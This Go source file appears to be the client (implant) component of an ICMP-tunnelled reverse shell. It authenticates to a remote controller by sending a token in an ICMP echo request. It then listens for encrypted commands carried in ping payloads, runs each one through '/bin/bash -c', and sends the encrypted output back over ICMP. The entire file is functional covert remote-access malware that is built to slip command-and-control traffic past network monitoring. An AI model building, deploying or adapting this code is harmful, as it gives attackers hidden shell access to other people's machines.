package shell

import (
	"bytes"
	"fmt"
	"github.com/d1nfinite/go-icmpshell/common"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/google/gopacket/routing"
	"net"
	"os/exec"
)

type Shell struct {
	icmpId uint16
	common.Auth
	common.Communicate
}

type Option func(shell *Shell) *Shell

func WithToken(token []byte) Option {
	return func(shell *Shell) *Shell {
		shell.Token = token
		return shell
	}
}

func WithIcmpId(id uint16) Option {
	return func(shell *Shell) *Shell {
		shell.icmpId = id
		return shell
	}
}

func NewShell(ip net.IP, opts ...Option) (*Shell, error) {
	router, err := routing.New()
	if err != nil {
		return nil, err
	}

	iface, gw, src, err := router.Route(ip)
	if err != nil {
		return nil, err
	}

	s := &Shell{
		Communicate: common.Communicate{
			Src:     src,
			Dst:     ip,
			Gateway: gw,
			Iface:   iface,
			Seq:     1,
		},
		icmpId: 1000,
		Auth:   common.Auth{Token: []byte{10, 10}},
	}

	// Options
	for _, opt := range opts {
		s = opt(s)
	}

	// Open handle
	handle, err := pcap.OpenLive(iface.Name, 65536, false, pcap.BlockForever)
	if err != nil {
		return nil, err
	}
	s.PcapSendHandle = handle

	// Get dst hw addr
	hwAddr, err := s.GetHwAddr()
	if err != nil {
		return nil, err
	}
	s.DstHwAddr = hwAddr

	return s, nil
}

func (s *Shell) Handshake() error {
	// Send token to server
	err := s.SendICMP(s.Token, s.icmpId, layers.ICMPv4TypeEchoRequest)
	if err != nil {
		return err
	}

	return nil
}

// ListenICMP will decode icmp packet from device which contains shell command
func (s *Shell) ListenICMP() {
	s.PcapSendHandle.SetBPFFilter("icmp")

	packetSource := gopacket.NewPacketSource(s.PcapSendHandle, s.PcapSendHandle.LinkType())
	lastOutput := s.Token
	for packet := range packetSource.Packets() {
		icmpLayer := packet.Layer(layers.LayerTypeICMPv4)
		if icmpLayer == nil {
			continue
		}

		switch v := icmpLayer.(type) {
		case *layers.ICMPv4:
			if v.Id == s.icmpId {
				// Flow check
				if bytes.Compare(packet.NetworkLayer().NetworkFlow().Src().Raw(), s.Src) == 0 {
					continue
				}

				// Auto reply check
				if bytes.Compare(lastOutput, v.Payload) == 0 {
					continue
				}

				commandDecrypt, err := s.Decrypt(v.Payload)
				if err != nil {
					fmt.Println(err)
					continue
				}

				// Ensure that ping packets correspond one-to-one
				// Return an error message even if the output is empty
				output, err := s.execute(commandDecrypt)
				if err != nil {
					fmt.Println(err)
					output = []byte(err.Error())
				}
				output = append(output, []byte("\n")...)

				outputEnrypt, err := s.Encrypt(output)
				if err != nil {
					fmt.Println(err)
					continue
				}
				lastOutput = outputEnrypt

				err = s.SendICMP(outputEnrypt, 1000, layers.ICMPv4TypeEchoRequest)
				if err != nil {
					fmt.Println(err)
					continue
				}
			}
		}
	}
}

func (s *Shell) execute(payload []byte) ([]byte, error) {
	cmd := exec.Command("/bin/bash", "-c", string(payload))
	output, err := cmd.Output()
	if err != nil {
		return nil, err
	}

	return output, nil
}
